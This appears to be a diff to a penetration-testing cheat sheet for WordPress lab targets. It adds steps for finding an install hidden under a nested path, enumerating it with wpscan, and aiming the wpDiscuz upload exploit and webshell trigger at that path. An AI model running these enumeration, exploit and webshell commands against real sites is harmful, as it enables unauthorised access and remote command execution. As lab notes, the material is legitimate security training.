@@ -23,6 +23,28 @@ http://TARGET/SHARE-NAME/wp-login.php
 
 This can uncover a WordPress installation that ordinary root-level content discovery missed. Use the recovered credentials at the discovered login page.
 
+WordPress may also be buried beneath an unusual path that initially looks like static content. Recursive content discovery can expose WordPress markers such as `wp-admin`, `wp-content`, `wp-includes`, `wp-login.php`, and `readme.html` below that path:
+
+```text
+http://TARGET/assets/fonts/blog/wp-admin/
+http://TARGET/assets/fonts/blog/wp-content/
+http://TARGET/assets/fonts/blog/wp-includes/
+http://TARGET/assets/fonts/blog/wp-login.php
+```
+
+Follow redirects from those endpoints. A redirect may disclose the hostname WordPress expects:
+
+```text
+Location: http://blogger.pg/assets/fonts/blog/wp-login.php
+```
+
+Add the disclosed hostname to `/etc/hosts`, then use the complete nested WordPress root for subsequent enumeration:
+
+```bash
+echo 'TARGET_IP blogger.pg' | sudo tee -a /etc/hosts
+wpscan --url http://blogger.pg/assets/fonts/blog/ --enumerate ap,at,cb,dbe,u --plugins-detection aggressive --no-update
+```
+
 ---
 
 ## WPScan Enumeration
@@ -411,6 +433,18 @@ python3 wp_discuz.py -u http://TARGET -p /?p=1
 
 # If exploit fails, use uploaded webshell
 curl http://TARGET/wp-content/uploads/2021/08/SHELL.php?cmd=id
+```
+
+For WordPress installed below a nested path, ensure the exploit submits its upload request to that installation's `wp-admin/admin-ajax.php`, not the web-server root:
+
+```text
+http://TARGET/assets/fonts/blog/wp-admin/admin-ajax.php
+```
+
+Trigger the uploaded shell beneath the same WordPress root:
+
+```bash
+curl 'http://TARGET/assets/fonts/blog/wp-content/uploads/YEAR/MONTH/SHELL.php?cmd=id'
 ```
 
 ---
